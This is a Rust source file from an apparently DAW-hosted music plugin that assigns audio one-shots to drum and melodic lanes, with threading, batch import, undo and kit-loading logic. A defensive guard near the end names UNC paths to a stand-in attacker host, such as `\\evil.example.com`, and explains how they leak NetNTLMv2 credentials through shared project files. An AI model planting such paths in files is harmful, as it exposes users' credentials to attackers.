//! Assigning your own one-shot to a part (TASK-131B).
//!
//! Mike, 2026-08-04: *"you should be able to **add** one-shots for your
//! drums/melody/countermelody/basslines/chords as well so that you can play the
//! sounds with the midi before even exporting them or dragging anything to your
//! DAW."*
//!
//! ## ⛔ Why this is a thread and a mailbox, exactly like `export`
//!
//! A native Open dialog is **modal and blocking**, and the bridge answers the
//! webview on a frame the page is waiting on — inside a host, that is the DAW's
//! own editor thread. Opening a dialog there stalls the host for as long as the
//! producer is browsing: no crash, no error, and no way out but killing the DAW.
//! [`crate::export`] has the full write-up and this follows it exactly, down to
//! the one-at-a-time claim and the always-publish-a-terminal-status rule.
//!
//! The decode rides on the same thread for a second reason of its own: symphonia
//! is parsing an **untrusted file**, and however cheap that usually is, it is not
//! something to do on the thread a host draws its window from.
//!
//! ## What is per lane, and what is per instance
//!
//! The assignment is **per lane**, not per part. Drums is eight lanes, and one
//! sample stretched across kick, snare and hat is not a thing anybody wants;
//! melody, countermelody, bassline and chords are one lane each, so per-lane is
//! also exactly what Mike asked for. The whole map is per plugin *instance*: the
//! kit built on one track is not the kit wanted on the next.

use std::collections::BTreeMap;
use std::path::Path;
use std::sync::{Arc, Mutex};

use engine::pattern::Lane;
use serde::Serialize;

use crate::audio::import;
use crate::audio::kit::{Kit, OneShot};
use crate::shared::KitHandoff;
use crate::state::SessionStore;

/// How an assignment ended, for the page to show.
///
/// The same shape and the same rules as [`crate::export::Status`]: `Cancelled`
/// is **not** a failure, and a terminal status is taken once.
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase", tag = "state")]
pub enum Status {
    /// Nothing has happened since the last time the page looked.
    #[default]
    Idle,
    /// A dialog is open, or a file is being decoded.
    Running,
    /// Loaded and playing.
    Done {
        lane: Lane,
        name: String,
    },
    /// The producer closed the dialog. **Not an error** — it is the ordinary
    /// way out of an Open, and reporting it as a failure would train people to
    /// ignore the one message that matters.
    Cancelled,
    Failed {
        reason: String,
    },
    /// A batch import finished: how many pads were filled, and every file that
    /// did not land (TASK-049).
    ///
    /// ⛔ **The refusals are a LIST, not the last one.** [`Self::Failed`] carries
    /// a single reason because its callers draw from a folder the producer
    /// merely *browsed* — a re-roll that found no snare in it is not news. A
    /// batch is files they picked by hand, so every one of them is a sound they
    /// expected to hear, and *"18 of 20 landed"* without naming the two is the
    /// readout-that-lies failure in its counting form. TASK-049's own line:
    /// *"per-file error toasts that never abort the batch"*.
    Imported {
        loaded: usize,
        refused: Vec<Refused>,
    },
    /// A whole kit was put back by an undo or a redo (TASK-050A).
    ///
    /// ⛔ **Says nothing unless something could not be restored**, which is the
    /// rule [`OneShots::restore`] already states for the reopen path: *"a reopen
    /// that announces five toasts nobody asked for is noise. A failure is still
    /// reported, because a sample that did not come back is something the
    /// producer has to know."* An undo is the same kind of event — machine
    /// driven, not a dialog the producer is standing in front of — so it gets
    /// the same manners. It is a distinct variant rather than
    /// [`Self::Imported`] precisely so the panel cannot answer Ctrl+Z with
    /// *"12 placed on the pads"*, which would be a true count of a thing that
    /// did not happen.
    Restored {
        refused: Vec<Refused>,
    },
}

/// One file a batch import did not put on a pad, and why.
#[derive(Debug, Clone, PartialEq, Eq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Refused {
    /// The file's own name.
    ///
    /// ⚠ **Never the full path.** This is drawn in a toast inside somebody
    /// else's DAW, and where a producer keeps their samples is theirs. The name
    /// is also the only part they can act on — it is what they would rename.
    pub name: String,
    pub reason: String,
}

/// What was measured about one assigned sample, for the KIT panel to draw.
#[derive(Debug, Clone, Copy, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct Measured {
    /// The note it is in, or `None` — see [`crate::audio::pitch::detect_root`]
    /// for why that is a real answer and the common one (TASK-052).
    pub root: Option<crate::audio::pitch::Root>,
    /// Whether a held note on it holds, or `None` on a lane where holding a
    /// note means nothing at all (TASK-053A).
    ///
    /// ⚠ **Three states, and the middle one is the point.** `Some(false)` is
    /// the one that earns a sentence on screen: the sample has no steady part,
    /// so a long note ends where the file does.
    pub holds: Option<bool>,
}

/// The one-shots this instance has assigned, and the one dialog that assigns
/// them.
#[derive(Debug, Default)]
pub struct OneShots {
    /// Lane to sample. Shared with the loader thread, which is the only thing
    /// that writes it.
    assigned: Arc<Mutex<BTreeMap<Lane, OneShot>>>,
    /// Paths the project asked for that could not be loaded.
    ///
    /// ⛔ **Without this, a moved sample was deleted from the project rather
    /// than reported missing.** `apply` rewrites `one_shots` wholesale from
    /// `assigned`, and a failed reload never reaches `assigned` — so the next
    /// assignment or clear wrote a map with that lane absent, and the path was
    /// gone for good. Putting the file back no longer restored it. This keeps
    /// what the project asked for so the write can preserve it, which is what
    /// `restore_one_shots`'s own doc already promised: "logged and skipped, not
    /// fatal … the producer must still get their project back".
    missing: Arc<Mutex<BTreeMap<Lane, String>>>,
    status: Arc<Mutex<Status>>,
}

impl OneShots {
    /// Open a dialog, decode what is picked, and play it on `lane`.
    ///
    /// Returns as soon as the thread is running — see the module header.
    pub fn assign(
        &self,
        lane: Lane,
        kits: &Arc<KitHandoff>,
        session: &SessionStore,
    ) -> Result<(), String> {
        let claimed = self.claim()?;
        let assigned = Arc::clone(&self.assigned);
        let missing = Arc::clone(&self.missing);
        let kits = Arc::clone(kits);
        let session = SessionStore::clone(session);
        std::thread::spawn(move || {
            let status = match pick_file() {
                None => Status::Cancelled,
                // ⚠ Forwards: the Open dialog and the folder re-roll have no
                // reverse gesture. Only `Ctrl`+← asks for one, and it comes
                // through `restore`.
                Some(path) => match load(&path, false, lane) {
                    Ok(one_shot) => {
                        let name = one_shot.name.clone();
                        apply(&assigned, &missing, &kits, &session, |map| {
                            map.insert(lane, one_shot);
                        });
                        Status::Done { lane, name }
                    }
                    Err(reason) => Status::Failed { reason },
                },
            };
            claimed.publish(status);
        });
        Ok(())
    }

    /// Take a whole selection in one dialog and fill the pads their names name
    /// (TASK-049's batch import — and the caller TASK-050 has been missing).
    ///
    /// ⛔ **The filename IS the assignment rule, and it is [`crate::roles::guess`]
    /// — the classifier that shipped 2026-08-09 with nothing calling it.** A
    /// producer dropping a sample pack in has already done the sorting: the
    /// files are called `Kick 01.wav` and `OH_dark.wav`. Making them place
    /// twelve of those one Open dialog at a time is exactly the work this
    /// removes, and it is the only reason to guess at all — the roadmap's own
    /// rule is that *"a wrong guess a producer overrides in one click is
    /// useful, a wrong guess that silently becomes the assignment is not"*, and
    /// every pad here stays one click from being repointed.
    ///
    /// ⛔ **A second file for a lane this batch already filled is REFUSED BY
    /// NAME, not allowed to win.** Two kicks in one selection is ordinary — a
    /// pack ships `Kick 01`…`Kick 08` — and the alternative is that the pad
    /// silently holds whichever the platform handed over last. Saying which
    /// file was dropped is what lets the producer pick the one they meant.
    /// ⚠ Pads filled *before* the batch are fair game: these are files they
    /// just asked for.
    ///
    /// ⛔ **It never aborts.** A name that classifies to nothing, a remote path
    /// and a file that will not decode are each one entry in
    /// [`Status::Imported::refused`]; everything else still lands. TASK-049
    /// states this as *"per-file error toasts that never abort the batch"*, and
    /// its verify line is a 20-file batch with 2 corrupt files giving 18 pads
    /// and 2 toasts.
    ///
    /// Returns as soon as the thread is running — see the module header.
    pub fn add_many(&self, kits: &Arc<KitHandoff>, session: &SessionStore) -> Result<(), String> {
        let claimed = self.claim()?;
        let assigned = Arc::clone(&self.assigned);
        let missing = Arc::clone(&self.missing);
        let kits = Arc::clone(kits);
        let session = SessionStore::clone(session);

        std::thread::spawn(move || {
            // ⚠ An empty selection is a cancel, not an import of nothing. Some
            // platforms answer `Some(vec![])` for a dialog dismissed sideways.
            let picked = pick_files().unwrap_or_default();
            if picked.is_empty() {
                claimed.publish(Status::Cancelled);
                return;
            }

            let (pairs, mut refused) = lanes_for(&picked);
            let (loaded, failures) = decode_all(&pairs);
            refused.extend(failures);

            let count = loaded.len();
            if count > 0 {
                // ⛔ One `apply` for the whole selection — `load_many`'s own doc
                // has the reason at length: each one cuts every sounding voice.
                apply(&assigned, &missing, &kits, &session, |map| {
                    for (lane, one_shot) in loaded {
                        map.insert(lane, one_shot);
                    }
                });
            }
            claimed.publish(Status::Imported {
                loaded: count,
                refused,
            });
        });
        Ok(())
    }

    /// Re-roll each of `lanes` from the files in `folder` (TASK-050A).
    ///
    /// ⛔ **On the loader thread, exactly like [`Self::assign`], and for a
    /// sharper reason.** One assign decodes one file; a kit-level re-roll
    /// decodes up to a dozen, and doing that on the thread answering the webview
    /// is the freeze this project has already had to fix once this week. It
    /// claims the same slot, so a re-roll and an Open dialog cannot run at once.
    ///
    /// ⛔ **The caller decides which lanes**, and that is where the lock rule
    /// lives. A locked pad is exempt (TASK-044's rule, applied to pads), and the
    /// page is what knows which are locked — a second copy of that state here is
    /// how the two would start disagreeing.
    ///
    /// ⚠ **Seeded, so a re-roll is reproducible and a *different* seed is a
    /// different kit.** The page supplies it, the same way it supplies the
    /// timestamp for a variation: nothing in the engine or here may read a
    /// clock.
    pub fn randomize(
        &self,
        lanes: Vec<Lane>,
        files: Vec<String>,
        seed: u64,
        kits: &Arc<KitHandoff>,
        session: &SessionStore,
    ) -> Result<(), String> {
        if lanes.is_empty() {
            return Err("no lanes to re-roll — every one of them is locked".to_owned());
        }
        if files.is_empty() {
            return Err("that folder has nothing this could put on a pad".to_owned());
        }

        let pairs: Vec<(Lane, String, bool)> = lanes
            .iter()
            // ⚠ Skipped rather than fatal: a folder with no snare in it should
            // still re-roll the kick, and saying so lane by lane would be a
            // dozen toasts for one gesture.
            // ⚠ Forwards — the re-roll has no reverse gesture either.
            .filter_map(|lane| pick_for(*lane, &files, seed).map(|path| (*lane, path, false)))
            .collect();

        self.load_many(
            pairs,
            "nothing in that folder matched the lanes being re-rolled",
            kits,
            session,
        )
    }

    /// Decode `pairs` off-thread and put all of them on at once.
    ///
    /// ⛔⛔ **One `apply` for the whole set, not one per lane.** Each call
    /// rebuilds the kit and hands it to the audio thread, which cuts every
    /// sounding voice — a dozen of those in a row is a dozen audible stutters
    /// for one gesture. This is shared by the folder re-roll (TASK-050A) and by
    /// loading a saved kit (TASK-051) precisely so the rule cannot hold in one
    /// and not the other, which is the drift class this codebase keeps writing
    /// down.
    ///
    /// `empty_reason` is what to say when nothing decoded, because "no snare in
    /// that folder" and "every sample in that kit has moved" are different
    /// problems and a producer can act on the difference.
    fn load_many(
        &self,
        pairs: Vec<(Lane, String, bool)>,
        empty_reason: &str,
        kits: &Arc<KitHandoff>,
        session: &SessionStore,
    ) -> Result<(), String> {
        let claimed = self.claim()?;
        let assigned = Arc::clone(&self.assigned);
        let missing = Arc::clone(&self.missing);
        let kits = Arc::clone(kits);
        let session = SessionStore::clone(session);
        let empty_reason = empty_reason.to_owned();

        std::thread::spawn(move || {
            let (loaded, refused) = decode_all(&pairs);

            let status = if loaded.is_empty() {
                Status::Failed {
                    // ⛔ **The caller's own sentence FIRST, and the decoder's
                    // after it.** *"No snare in that folder"* and *"every sample
                    // in that kit has moved"* are different problems a producer
                    // can act on the difference between, which is why
                    // `empty_reason` is passed in at all — and it had become
                    // unreachable: `decode_all` now records a refusal for every
                    // failed pair, including the remote-path skips the old loop
                    // passed over silently, so `refused` is never empty here.
                    // Composing keeps the context and gains the specific.
                    //
                    // ⚠ **The LAST refusal, not the first** — this path has
                    // always shown one reason for a whole set. The batch that
                    // reports all of them is [`Status::Imported`].
                    reason: refused.last().map_or(empty_reason.clone(), |last| {
                        format!("{empty_reason} — {}", last.reason)
                    }),
                }
            } else {
                let count = loaded.len();
                let last = loaded[count - 1].0;
                apply(&assigned, &missing, &kits, &session, |map| {
                    for (lane, one_shot) in loaded {
                        map.insert(lane, one_shot);
                    }
                });
                Status::Done {
                    lane: last,
                    name: format!("{count}"),
                }
            };
            claimed.publish(status);
        });
        Ok(())
    }

    /// Replace every assignment at once — how one undo step puts a whole kit
    /// back (TASK-050A).
    ///
    /// ⛔ **Replaces rather than merges, and that is the whole difference from
    /// [`Self::load_kit`].** Undo has to be able to make a pad EMPTY again: a
    /// producer who put their own snare on and pressed Ctrl+Z must hear the
    /// shipped one, and a merge would leave theirs playing because the snapshot
    /// simply does not mention that lane. A saved kit is *a set of pads to
    /// fill*; a snapshot is a statement about all of them, the empty ones
    /// included.
    ///
    /// ⛔ **An empty set is a real request, not an error.** Undoing back past
    /// the first assignment of a session restores a kit with nothing of the
    /// producer's on it, and refusing that — the way [`Self::load_kit`] refuses
    /// an empty kit file — would put the bottom of the undo stack out of reach.
    ///
    /// ⛔ **A path that has since moved is DROPPED rather than remembered, and
    /// this is the one place that is right.** `apply` deliberately preserves
    /// paths that failed to load so a reopened project does not lose them. A
    /// snapshot is not a reopen: carrying a stale path through an undo would
    /// put a lane back into the missing state the producer has already stepped
    /// away from, and the next edit would persist it again.
    /// ⛔⛔ **A lane the kit is ALREADY playing is reused, not re-read.** Undo is
    /// a held-down gesture and a snapshot names the whole kit, so decoding it
    /// wholesale meant every Ctrl+Z re-read a dozen files off disk, re-decoded
    /// and re-resampled them, and re-ran an NSDF on every pitched one — to
    /// arrive at eleven samples already sitting decoded in `assigned`, because
    /// only one of them had moved.
    ///
    /// ⛔⛔ **And reuse is what keeps a REVERSED pad reversed.** A snapshot
    /// carries the direction beside the path, but the reuse is what makes the
    /// common case exact rather than a re-decode that has to be told: the
    /// stored [`OneShot`] already holds its flipped buffer, its measured root
    /// and its loop region.
    pub fn set_all(
        &self,
        pairs: Vec<(Lane, String, bool)>,
        kits: &Arc<KitHandoff>,
        session: &SessionStore,
    ) -> Result<(), String> {
        let claimed = self.claim()?;
        let assigned = Arc::clone(&self.assigned);
        let missing = Arc::clone(&self.missing);
        let kits = Arc::clone(kits);
        let session = SessionStore::clone(session);

        std::thread::spawn(move || {
            // What is already loaded, so an unchanged lane costs a clone of two
            // `Arc`s rather than a disk read. ⚠ Taken and released before
            // `decode_all`, which is slow and must not hold this lock.
            let held: BTreeMap<Lane, OneShot> = assigned
                .lock()
                .map(|map| map.clone())
                .unwrap_or_else(|_| BTreeMap::new());

            let mut loaded: Vec<(Lane, OneShot)> = Vec::new();
            let mut stale: Vec<(Lane, String, bool)> = Vec::new();
            // Every lane the snapshot names, kept so the `missing` clear below
            // can be scoped to exactly them.
            let named = pairs.clone();
            for (lane, path, reversed) in pairs {
                // ⚠ The direction is part of the match: the same file assigned
                // backwards is a different buffer, and reusing the forward one
                // would silently un-reverse the pad.
                match held.get(&lane) {
                    Some(one) if one.path == path && one.reversed == reversed => {
                        loaded.push((lane, one.clone()));
                    }
                    _ => stale.push((lane, path, reversed)),
                }
            }

            let (fresh, refused) = decode_all(&stale);
            loaded.extend(fresh);

            // ⛔⛔ **Only the lanes this snapshot HAS AN OPINION ABOUT, and that
            // scoping is the whole of the fix.** Clearing the map wholesale
            // deleted the remembered path of a lane the undo never touched: a
            // project whose snare had moved keeps that path in `missing` so
            // `apply` can chain it back into `one_shots` and putting the file
            // back still restores it — which is the entire reason that field
            // exists. But a missing lane reports `path: null` through
            // `kit_state`, so the page's snapshot cannot mention it, so a
            // wholesale clear dropped it from the project for good on the first
            // Ctrl+Z after any assignment.
            //
            // ⚠ Cleared BEFORE `apply`, which reads what is left to preserve
            // the paths of lanes outside this restore.
            if let Ok(mut map) = missing.lock() {
                for (lane, _, _) in &named {
                    map.remove(lane);
                }
            }
            apply(&assigned, &missing, &kits, &session, |map| {
                map.clear();
                for (lane, one_shot) in loaded {
                    map.insert(lane, one_shot);
                }
            });

            claimed.publish(Status::Restored { refused });
        });
        Ok(())
    }

    /// Put a saved kit's samples on, all at once (TASK-051).
    ///
    /// ⚠ **A kit that has lost some of its samples still loads the rest.** A
    /// producer who moved one folder should get eleven of their twelve pads
    /// back, not a refusal — the same rule a reopened project already follows.
    pub fn load_kit(
        &self,
        pairs: Vec<(Lane, String)>,
        kits: &Arc<KitHandoff>,
        session: &SessionStore,
    ) -> Result<(), String> {
        if pairs.is_empty() {
            return Err("that kit has no samples in it".to_owned());
        }
        self.load_many(
            // ⚠ Forwards: a saved kit stores paths, not directions — the
            // reversal a producer set with `Ctrl`+← belongs to the project, and
            // `kits::save` deliberately writes neither.
            pairs
                .into_iter()
                .map(|(lane, path)| (lane, path, false))
                .collect(),
            "every sample in that kit has moved or been deleted",
            kits,
            session,
        )
    }

    /// Load `path` onto `lane` with no dialog — how a reopened project gets its
    /// one-shots back (TASK-131B persistence).
    ///
    /// ⚠ **Does not claim the dialog slot**, deliberately: restoring a project
    /// must not be refused because a producer happens to have an Open dialog up,
    /// and it must not be able to *cause* one to be refused either. It publishes
    /// no status on success for the same reason — a reopen that announces five
    /// toasts nobody asked for is noise. A failure is still reported, because a
    /// sample that did not come back is something the producer has to know.
    pub fn restore(
        &self,
        lane: Lane,
        path: &str,
        reversed: bool,
        kits: &Arc<KitHandoff>,
        session: &SessionStore,
    ) -> Result<(), String> {
        let raw = path.to_owned();
        let path = Path::new(path);
        // ⛔ Recorded BEFORE the attempt, so a refusal or a decode failure
        // leaves the project still naming the file the producer chose.
        if let Ok(mut held) = self.missing.lock() {
            held.insert(lane, raw);
        }
        refuse_remote(path)?;
        let one_shot = load(path, reversed, lane)?;
        if let Ok(mut held) = self.missing.lock() {
            held.remove(&lane);
        }
        apply(&self.assigned, &self.missing, kits, session, |map| {
            map.insert(lane, one_shot);
        });
        Ok(())
    }

    /// Put a lane back on whatever the shipped kit plays there.
    pub fn clear(&self, lane: Lane, kits: &Arc<KitHandoff>, session: &SessionStore) {
        // A lane the producer cleared must lose its remembered path as well as
        // its loaded sample, or "clear" would leave the project still asking
        // for the file on the next open.
        if let Ok(mut held) = self.missing.lock() {
            held.remove(&lane);
        }
        apply(&self.assigned, &self.missing, kits, session, |map| {
            map.remove(&lane);
        });
    }

    /// The kit that is actually playing: the shipped one with this instance's
    /// one-shots over it.
    ///
    /// ⛔ **Exported audio must render through THIS, not through
    /// `preview_kit()`.** The first cut of `start_pattern_stems` used the
    /// shipped kit, so a producer who assigned their own snare heard it in the
    /// preview and got the stock one in the exported wav — the plugin telling
    /// them one thing and writing another, which is the readout-that-lies
    /// failure this project keeps finding.
    /// ⚠ **Takes the model, because the base kit is the model's** (TASK-140/#23).
    /// It used to resolve `preview_kit()` — the trap kit — for every artist
    /// alive, so a drill or country producer exported trap samples. Same class
    /// of bug as the one the doc above records, one layer further out.
    /// ⚠ **`with_tweaks` runs after `with_one_shots`, never before** — the trim
    /// window and the normalize peak are measurements of whichever buffer will
    /// actually play, so they have to be taken once the swap has happened.
    pub fn current_kit(
        &self,
        model_id: &str,
        tweaks: &BTreeMap<Lane, crate::pad_tweaks::PadTweaks>,
    ) -> Option<Arc<Kit>> {
        let base = crate::audio::kit_for_model(model_id)?;
        let map = self.assigned.lock().ok()?;
        Some(Arc::new(base.with_one_shots(&map).with_tweaks(tweaks)))
    }

    /// Rebuild and re-publish the kit without changing what is assigned.
    ///
    /// ⛔ **What a pad edit needs and an assignment does not.** Changing a gain
    /// or an envelope leaves `assigned` untouched, so none of the paths above
    /// fire — and without this the audio thread would go on playing the kit it
    /// was handed before the producer touched the control.
    pub fn rebuild(&self, kits: &Arc<KitHandoff>, session: &SessionStore) {
        apply(&self.assigned, &self.missing, kits, session, |_| {});
    }

    /// What is assigned, for the panel and for the project file.
    pub fn snapshot(&self) -> BTreeMap<Lane, (String, String)> {
        let Ok(map) = self.assigned.lock() else {
            return BTreeMap::new();
        };
        map.iter()
            .map(|(lane, one_shot)| (*lane, (one_shot.path.clone(), one_shot.name.clone())))
            .collect()
    }

    /// What was measured about each assigned sample: its root (TASK-052) and
    /// whether it can be held (TASK-053A).
    ///
    /// ⚠ **Its own reader rather than more elements on [`Self::snapshot`]'s
    /// tuple**, which `kits_save` also walks: a saved kit is a list of paths a
    /// producer named, and it has no business carrying measurements that will
    /// be taken again the moment those paths are decoded.
    ///
    /// ⚠ **One reader for both, and one walk under one lock.** They were two,
    /// called back to back by `kit_state` — which `refresh()` runs after every
    /// gesture in the app — so the same map was locked and walked twice to
    /// answer two facts about the same sample.
    pub fn measured(&self) -> BTreeMap<Lane, Measured> {
        let Ok(map) = self.assigned.lock() else {
            return BTreeMap::new();
        };
        map.iter()
            .map(|(lane, one_shot)| {
                (
                    *lane,
                    Measured {
                        root: one_shot.root,
                        // ⛔ **`None` unless the lane can be held at all**, which
                        // is `roles::is_melodic` for the reason `load` gives at
                        // length — `Lane::Sub` rings out, so *"this sample has no
                        // steady part to hold"* would be a claim about a lane
                        // where no note is ever gated. Absent is the honest
                        // answer and the panel draws nothing for it.
                        holds: crate::roles::is_melodic(*lane)
                            .then_some(one_shot.loop_region.is_some()),
                    },
                )
            })
            .collect()
    }

    /// Read the outcome, and clear it if there is one.
    ///
    /// ⛔ **Taken rather than merely read**, for the reason
    /// [`crate::export::Exports::take_status`] gives: the page polls this, so a
    /// terminal status left in place re-announces itself on every tick.
    pub fn take_status(&self) -> Status {
        let mut slot = crate::held(&self.status);
        match &*slot {
            Status::Running => Status::Running,
            other => {
                let taken = other.clone();
                *slot = Status::Idle;
                taken
            }
        }
    }

    /// Take the one dialog slot, or say why it cannot be taken.
    fn claim(&self) -> Result<Claim, String> {
        let mut slot = crate::held(&self.status);
        if *slot == Status::Running {
            return Err("a sample is already being chosen — finish that one first".to_owned());
        }
        *slot = Status::Running;
        Ok(Claim(Arc::clone(&self.status)))
    }
}

/// Proof that the dialog slot was taken, and the handle for putting an outcome
/// back.
///
/// A value rather than a bare `Arc` so the claim and the publish cannot come
/// apart — the same trick `export::Claim` uses, for the same reason: a path that
/// claims and forgets to publish leaves the panel reading "choosing…" for the
/// rest of the session.
struct Claim(Arc<Mutex<Status>>);

impl Claim {
    fn publish(self, status: Status) {
        *crate::held(&self.0) = status;
    }
}

/// Ask the producer for a file.
///
/// The filter names the formats [`import`] can actually decode. ⚠ It is a filter
/// and not a guarantee — every platform lets the producer pick "all files" — so
/// the decoder still has to refuse a text file with a reason, which it does.
///
/// ⛔ **`engine::formats::AUDIO`, not a literal.** This was a second copy of the
/// explorer's list; they agreed by luck, and nothing would have reported it when
/// they stopped. ⚠ **Audio only here, deliberately** — this dialog assigns a
/// *one-shot to a drum pad*, and a `.mid` is not one however browsable it is
/// elsewhere.
fn pick_file() -> Option<std::path::PathBuf> {
    rfd::FileDialog::new()
        .add_filter("Audio", engine::formats::AUDIO)
        .pick_file()
}

/// The same dialog, letting the producer pick the whole pack at once (TASK-049).
///
/// ⚠ **Deliberately the same filter as [`pick_file`]**, from the same constant,
/// for the reason that function's own doc gives: a dialog offering a `.flac` the
/// decoder refuses is the two-lists failure TASK-049 opens by naming.
fn pick_files() -> Option<Vec<std::path::PathBuf>> {
    rfd::FileDialog::new()
        .add_filter("Audio", engine::formats::AUDIO)
        .pick_files()
}

/// Which pad each picked file belongs on, and which files answer nothing.
///
/// Split out from [`OneShots::add_many`] so the rule can be tested without a
/// native dialog in the way — the classifier is the whole of the behaviour, and
/// it is the half that would otherwise only ever run in front of a human.
fn lanes_for(picked: &[std::path::PathBuf]) -> (Vec<(Lane, String, bool)>, Vec<Refused>) {
    // ⚠ Forwards, every one: a multi-select dialog has no reverse gesture, the
    // same reason `assign` passes `false`. Only `Ctrl`+← assigns backwards.
    let mut pairs: Vec<(Lane, String, bool)> = Vec::new();
    let mut refused: Vec<Refused> = Vec::new();

    for path in picked {
        let name = file_name(path);

        let Some(lane) = crate::roles::guess(&name) else {
            refused.push(Refused {
                name,
                reason: "could not tell from the name which pad this is for".to_owned(),
            });
            continue;
        };
        // ⛔ First name wins — see [`OneShots::add_many`] for why the loser is
        // named rather than silently overwritten.
        if pairs.iter().any(|(taken, _, _)| *taken == lane) {
            refused.push(Refused {
                // ⚠ **The pad is not named, and that is deliberate.** `{lane:?}`
                // would put `ClosedHat` or `GhostSnare` — a Rust identifier —
                // into a panel translated into nineteen languages. The producer
                // can see which pads filled; what they cannot see is which of
                // their files lost, and that is the half this carries.
                reason: "another file in this batch already claimed that pad".to_owned(),
                name,
            });
            continue;
        }
        pairs.push((lane, path.display().to_string(), false));
    }

    (pairs, refused)
}

/// Decode every pair, keeping **all** the failures rather than the last.
///
/// ⛔ **One loop, three callers, because *"a file that will not decode must not
/// cost the producer the rest of the set"* is the same rule for a folder
/// re-roll, a saved kit and an import.** They differ only in how much of the
/// failure they report, which is the caller's decision and not this one's.
fn decode_all(pairs: &[(Lane, String, bool)]) -> (Vec<(Lane, OneShot)>, Vec<Refused>) {
    let mut loaded: Vec<(Lane, OneShot)> = Vec::new();
    let mut refused: Vec<Refused> = Vec::new();

    for (lane, path, reversed) in pairs {
        let as_path = Path::new(path);
        let name = file_name(as_path);

        // ⚠ **The same guard `restore` carries**, added for consistency rather
        // than because a live feed needs it: `randomize` draws from the
        // explorer's own listing and `load_kit` from a kit file written out of
        // `snapshot()` — but a saved kit is a file, and the day one becomes
        // importable a UNC path in it would authenticate outward on the first
        // read. A guard that is already there is not one somebody has to
        // remember.
        //
        // ⚠ **It DOES bind on `add_many`**, and that is a deliberate tightening
        // rather than an oversight: a producer multi-selecting from a
        // `\\server\share` library is refused here, where the single-file
        // `assign` — which calls `load` directly — still allows it. One dialog
        // is stricter than the other; the strict one is the new one, and no
        // path this guard refuses can reach `apply` or be persisted.
        if let Err(reason) = refuse_remote(as_path) {
            refused.push(Refused { name, reason });
            continue;
        }
        match load(as_path, *reversed, *lane) {
            Ok(one_shot) => loaded.push((*lane, one_shot)),
            Err(reason) => refused.push(Refused { name, reason }),
        }
    }

    (loaded, refused)
}

/// A file's own name, for a message a producer reads.
///
/// ⚠ **Never the full path.** These are drawn in a panel inside somebody else's
/// DAW, and where a producer keeps their samples is theirs; the name is also
/// the only part they can act on. One spelling because three call sites in this
/// file wanted it.
fn file_name(path: &Path) -> String {
    path.file_name()
        .and_then(|name| name.to_str())
        .unwrap_or_default()
        .to_owned()
}

/// Refuse a path that names something on the network.
///
/// ⛔⛔ **This is a real vulnerability, not hardening, and the reasoning that
/// missed it was written down in this very file.** The design note said an
/// attacker-controlled path could at worst cause a *local* read, because the
/// plugin is offline — no HTTP client is linked and `scripts/check-denylist.mjs`
/// enforces that. That is true of local paths and **false of UNC paths.**
///
/// On Windows `std::fs::metadata(r"\\evil.example.com\s\a.wav")` is not a read.
/// It hands the path to the SMB redirector, which resolves the host, connects
/// out, and performs a session setup that by default sends the logged-in user's
/// **NetNTLMv2 credentials**. The path *is* the exfiltration channel — nothing
/// has to be read back. `\\host@SSL@443\s\a.wav` does the same over WebDAV on
/// 443, so blocking 445 does not save you.
///
/// ⛔ **The delivery is ordinary for this product.** `one_shots` lives in the
/// `#[persist]` blob, so it rides inside any `.als`/`.flp` project or preset —
/// and producers trade project files, template packs and type-beat starters
/// constantly. Opening one would authenticate to the attacker with no
/// interaction beyond the open, and the failure would vanish into a `nih_log!`
/// line nobody reads.
///
/// ⚠ **Only on the reopen path.** [`OneShots::assign`] comes from a native file
/// dialog the producer drove themselves, so a network path chosen there is a
/// choice, not an injection. This is the one place a *file* gets to name a path.
///
/// ⚠ Verbatim (`\\?\`) and device (`\\.\`) prefixes are refused alongside UNC:
/// both can name remote resources and both bypass the normalisation that would
/// otherwise make a UNC path visible. A mapped drive letter still works, which
/// is how a producer with a network sample library actually refers to it.
pub(crate) fn refuse_remote(path: &Path) -> Result<(), String> {
    use std::path::{Component, Prefix};

    // ⛔ **Classified from the STRING as well as the components, because a
    // project file is portable and `Path` is not.** On Linux and macOS a
    // backslash is an ordinary filename character, so `Path::new(r"\\host\s\a")`
    // has no `Component::Prefix` at all and a components-only check waved
    // through the very payload this guard exists to stop. The attack travels in
    // a shared project; the machine that opens it is not the machine that wrote
    // it, so the rule must not depend on which one it is.
    // ⛔⛔ **A verbatim DISK path is local, and refusing it broke the File
    // Explorer outright.** `\\?\C:\samples\kick.wav` names drive C: and can name
    // nothing else — but it starts with `\\`, so the string test above classified
    // it as remote. That matters because **`Path::canonicalize` on Windows
    // returns exactly this form**: `Explorer::open` canonicalises the folder it
    // browses, `list` builds every row from `entry.path()` underneath it, and so
    // every path the page holds wears the prefix the moment a root is opened.
    //
    // The result, reported by Mike 2026-08-10: *"you can get to the subfolders
    // list, but you cannot go into those subfolders."* Opening a **root** worked
    // because roots are stored as they were added; opening any child of one was
    // refused as a network path. The same refusal silently took the preview
    // player (`preview_load`), the waveform, `.mid` reading, and — the one Mike
    // asked for first — **dropping a sample from the browser onto a pad**, since
    // `restore` is the landing for `explorer_drop` and it guards here too.
    //
    // ⚠ **`\\?\UNC\…` is still refused**, by `VerbatimUNC` below: that one really
    // does name a remote host, and it is in the hostile-path test. This exempts
    // the disk form only.
    //
    // ⚠ **Naturally platform-correct.** `Component::Prefix` is only ever produced
    // on Windows, so on Linux and macOS — where a project file's backslashes are
    // ordinary filename characters — this is always `false` and the string test
    // below still catches the payload this guard was written for.
    let verbatim_disk = matches!(
        path.components().next(),
        Some(Component::Prefix(prefix)) if matches!(prefix.kind(), Prefix::VerbatimDisk(..))
    );

    let text = path.to_string_lossy();
    let remote = !verbatim_disk
        && (text.starts_with("//")
            || text.starts_with(r"\\")
            || matches!(
                path.components().next(),
                Some(Component::Prefix(prefix)) if matches!(
                    prefix.kind(),
                    Prefix::UNC(..)
                        | Prefix::VerbatimUNC(..)
                        | Prefix::Verbatim(..)
                        | Prefix::DeviceNS(..)
                )
            ));

    if remote {
        return Err(
            "that sample is on a network path, which is not reloaded from a project file"
                .to_owned(),
        );
    }
    Ok(())
}

/// One file from `files` that could be `lane`'s, chosen on a seeded stream.
///
/// ⛔ **Filtered by [`crate::roles`] rather than picked at random from the
/// folder.** A dice that put a crash on the kick lane would be a novelty, not a
/// tool: the whole value of "re-roll this pad from the folder I am browsing" is
/// that what lands is plausibly the thing the pad is for.
///
